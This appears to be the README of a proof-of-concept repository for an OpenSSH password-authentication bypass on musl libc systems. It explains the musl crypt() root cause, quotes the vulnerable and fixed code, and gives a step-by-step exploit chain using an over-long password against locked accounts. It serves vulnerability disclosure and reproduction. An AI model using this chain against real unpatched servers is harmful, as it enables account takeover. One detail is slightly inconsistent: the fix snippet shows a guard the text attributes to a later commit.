# OpenssSesame — OpenSSH sshd password-auth bypass on musl libc

**CVE-2026-123158** ("sshole") — a remote, unauthenticated authentication bypass in
OpenSSH's `sshd` on Linux systems using **musl libc without PAM** (e.g. the default
Alpine Linux `openssh-server` package).

| | |
|---|---|
| **Product / version** | OpenSSH `< 10.6p2` (musl libc, PAM disabled — Alpine / OpenWrt / Yocto) |
| **CVSS 3.1** | `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.1 HIGH** |
| **CWE** | CWE-287 (Improper Authentication) — password-auth bypass |

## What it is

A password-authentication bypass: with a **257–1024 byte password**, a remote
unauthenticated attacker can log in as an account whose `/etc/shadow` password field
is the locked marker `"*"` (a key-only / no-password account), when at least one other
local account has a `$5$` (SHA-256) or `$6$` (SHA-512) hash. Added to CISA's Known
Exploited Vulnerabilities catalog on 2026-11-09 (actively exploited in the wild).

## Root cause

The bug is **not** in OpenSSH itself — it is in **musl libc's `crypt(3)`**:

- musl's SHA-256/SHA-512 crypt (`src/crypt/crypt_sha256.c`, `crypt_sha512.c`) cap the
  key length at `#define KEY_MAX 256` (DoS protection) and, per their own header comment,
  **"on error `"*"` is returned"** — a 1-byte sentinel string.
- OpenSSH's `sys_auth_passwd()` (the non-PAM path used on musl systems) accepts a login
  when `crypt(candidate, salt) == stored_hash`.
- A locked / key-only account's stored hash is the single character `"*"`.

So:

```
crypt("A"*300, "$6$<salt>")  ->  "*"        (musl error sentinel, key > 256 bytes)
"*" == "*"                   ->  match       (vulnerable comparison)
```

The OpenSSH-side fix (10.6p2) is a *workaround*: it requires
`strlen(stored_hash) >= MIN_PASSWORD_HASH_LEN` (4) **and** `salt != NULL` before it will
honour the `strcmp()`, which rejects the 1-byte `"*"` hash.

## Vulnerable code (`auth-passwd.c`, pre-10.6p2)

```c
int
sys_auth_passwd(struct ssh *ssh, const char *password)
{
	Authctxt *authctxt = ssh->authctxt;
	struct passwd *pw = authctxt->pw;
	char *encrypted_password, *salt = NULL;

	/* Just use the supplied fake password if authctxt is invalid */
	char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;

	if (pw_password == NULL)
		return 0;

	/* Check for users with no password. */
	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
		return (1);

	if (authctxt->valid && pw_password[0] && pw_password[1])
		salt = pw_password;
	encrypted_password = xcrypt(password, salt);

	/* Authentication is accepted if the encrypted passwords are identical. */
	return encrypted_password != NULL &&
	    strcmp(encrypted_password, pw_password) == 0;   // "*" == "*" -> ACCEPT
}
```

## Fix (10.6p2, commit `4353fdc`; further hardened by `1d28115`)

```c
#define MIN_PASSWORD_HASH_LEN	4
...
	ret = encrypted_password != NULL && salt != NULL &&
	    strlen(pw_password) >= MIN_PASSWORD_HASH_LEN &&
	    strcmp(encrypted_password, pw_password) == 0;
```

- `4353fdc43ef646c43a8dda7025cc1a898caf1482` — "avoid password authn bypass"
  (the **released** 10.6p2 workaround: `strlen(pw_password) >= MIN_PASSWORD_HASH_LEN`).
- `1d28115e040b792075a391de01b0f0c033a4850a` — "harden password checking"
  (post-10.6p2, on master: adds the `salt != NULL` guard).

## Exploit chain

1. Connect to `sshd` with `PasswordAuthentication` (default) over SSH.
2. Choose a target account with `*` in its shadow password field (locked / key-only).
3. Authenticate with any password of 257–1024 characters (e.g. `python3 -c "print('A'*300)"`).
4. `sys_auth_passwd()` derives `salt=NULL` (the 1-byte `"*"` has no usable salt), so
   `xcrypt()` calls `pick_salt()` which borrows a `$6$` salt from *another* account, then
   `crypt(long_pw, "$6$…")` returns `"*"`.
5. `strcmp("*", "*") == 0` → authentication succeeds; you are logged in as that account.

## Threat model (honest)

- **Reachable**: only on musl-libc systems with PAM disabled and `PasswordAuthentication`
  on (default) — Alpine Linux, OpenWrt, Yocto, and any musl-static `sshd`. glibc and PAM
  builds are unaffected (glibc `crypt()` does not return `"*"` for long keys).
- **Precondition**: the target account's hash must be the locked marker `"*"`, and another
  account must carry a `$5$`/`$6$` hash. The value of the bypass is exactly the value of the
  locked account — a key-only *service* account with a real shell is full account takeover;
  a fully-disabled account is less severe.
- **Root cause** is in musl `crypt()`, not OpenSSH; the OpenSSH change is a defensive
  workaround. Severity 8.1 (HIGH) reflects the extra preconditions (AC:H) versus a fully
  trivial auth bypass.
- Actively exploited in the wild (CISA KEV, 2026-11-09); reporter: Özgün Kültekin
  (Wakefield). Fixes: OpenSSH 10.6p2 and Alpine backports (10.6_p2-r0 etc.).

## Run

```bash
bash run.sh          # compiles exploit.c with musl-gcc -static and runs it
```

`run.sh` compiles the faithful reproduction with the musl cross-toolchain
(`x86_64-linux-musl-gcc -static`) and executes it. It drives the **real** OpenSSH
`sys_auth_passwd` / `xcrypt` / `pick_salt` / `shadow_pw` functions (copied verbatim from
the pinned commits) against **real musl `crypt()`**. Only `getpwent()`/`getspnam()` are
stubbed with a controlled `/etc/shadow` (account `locked` = `"*"`, account `root` = a valid
`$6$` hash), because a PoC cannot mutate the host `/etc/shadow` without root.

Expected output ends with:

```
RESULT: AUTHENTICATION BYPASS CONFIRMED (300-byte password authenticates as a locked account on musl; fixed build rejects)
```
